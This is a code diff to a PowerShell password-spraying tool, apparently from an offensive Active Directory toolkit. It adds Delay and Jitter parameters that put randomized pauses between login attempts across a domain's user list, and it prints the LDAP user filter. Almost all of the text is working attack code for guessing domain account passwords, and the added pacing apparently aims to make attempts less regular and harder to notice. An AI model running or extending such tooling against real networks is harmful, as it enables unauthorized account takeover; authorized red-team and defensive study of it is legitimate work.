@@ -87,7 +87,13 @@ function Invoke-DomainPasswordSpray{
 
      [Parameter(Position = 6, Mandatory = $false)]
      [switch]
-     $Force
+     $Force,
+     [Parameter(Mandatory = $false)]
+     [int]
+     $Delay=0,
+     [Parameter(Mandatory = $false)]
+     $Jitter=0
+
     )
 
     if ($Password)
@@ -187,7 +193,7 @@ function Invoke-DomainPasswordSpray{
 
     for($i = 0; $i -lt $Passwords.count; $i++)
     {
-        Invoke-SpraySinglePassword -Domain $CurrentDomain -UserListArray $UserListArray -Password $Passwords[$i] -OutFile $OutFile
+        Invoke-SpraySinglePassword -Domain $CurrentDomain -UserListArray $UserListArray -Password $Passwords[$i] -OutFile $OutFile -Delay $Delay -Jitter $Jitter
         if (($i+1) -lt $Passwords.count)
         {
             Countdown-Timer -Seconds (60*$observation_window)
@@ -380,6 +386,7 @@ function Get-DomainUserList
     {
         $UserSearcher.filter = "(&(objectCategory=person)(objectClass=user)$Filter)"
     }
+    Write-Host $UserSearcher.filter
 
     # grab batches of 1000 in results
     $UserSearcher.PageSize = 1000
@@ -447,13 +454,18 @@ function Invoke-SpraySinglePassword
             $Password,
             [Parameter(Position=4)]
             [string]
-            $OutFile
+            $OutFile,
+            [int]
+            $Delay=0,
+            [double]
+            $Jitter=0
     )
     $time = Get-Date
     $count = $UserListArray.count
     Write-Host "[*] Now trying password $Password against $count users. Current time is $($time.ToShortTimeString())"
     $curr_user = 0
     Write-Host -ForegroundColor Yellow "[*] Writing successes to $OutFile"
+    $RandNo = New-Object System.Random
 
     foreach ($User in $UserListArray)
     {
@@ -468,6 +480,10 @@ function Invoke-SpraySinglePassword
         }
         $curr_user += 1
         Write-Host -nonewline "$curr_user of $count users tested`r"
+        if ($Delay)
+        {
+            Start-Sleep -Seconds $RandNo.Next((1-$Jitter)*$Delay, (1+$Jitter)*$Delay)
+        }
     }
 
 }
@@ -484,5 +500,4 @@ function Get-ObservationWindow()
     [int]$observation_window = [convert]::ToInt32($observation_window_no_spaces, 10)
     return $observation_window
 }
-
 
